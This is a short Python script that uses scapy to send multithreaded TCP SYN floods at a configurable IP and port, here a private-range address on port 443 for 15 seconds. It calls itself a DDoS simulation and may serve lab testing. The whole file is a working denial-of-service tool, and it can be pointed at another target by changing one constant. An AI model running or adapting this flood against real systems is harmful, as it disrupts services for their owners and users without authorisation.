import scapy.all as scapy
import threading
import time
import random
from scapy.layers.inet import IP, TCP

# 🚀 Attack Target Configuration
TARGET_IP = "192.168.218.152"  # Fixed: Removed leading space
TARGET_PORT = 443
ATTACK_DURATION = 15

# 🚨 Attack Configuration
PACKETS_PER_SECOND = 15
THREAD_COUNT = 10
RUNNING = True  # Global flag for thread control

def ddos_attack():
    """Sends a high volume of TCP SYN packets to simulate a DDoS attack."""
    start_time = time.time()
    try:
        while RUNNING and time.time() - start_time < ATTACK_DURATION:
            # Randomize source port for more realistic simulation
            sport = random.randint(1024, 65535)
            packet = IP(dst=TARGET_IP)/TCP(dport=TARGET_PORT, sport=sport, flags="S")
            try:
                scapy.send(packet, verbose=False)
            except Exception as e:
                print(f"⚠️ Packet send error: {e}")
                break
            time.sleep(1 / PACKETS_PER_SECOND)
    except KeyboardInterrupt:
        return

# 🚀 Start multiple attack threads
threads = []
try:
    for _ in range(THREAD_COUNT):
        thread = threading.Thread(target=ddos_attack)
        thread.daemon = True
        threads.append(thread)
        thread.start()

    print(f"🚀 DDoS Simulation Started: Attacking {TARGET_IP}:{TARGET_PORT} for {ATTACK_DURATION} seconds...")
    
    # Wait for attack duration or Ctrl+C
    time.sleep(ATTACK_DURATION)
    
except KeyboardInterrupt:
    print("\n🛑 Stopping attack...")
finally:
    RUNNING = False
    for thread in threads:
        thread.join(timeout=1)
    print("✅ DDoS Simulation Completed!")
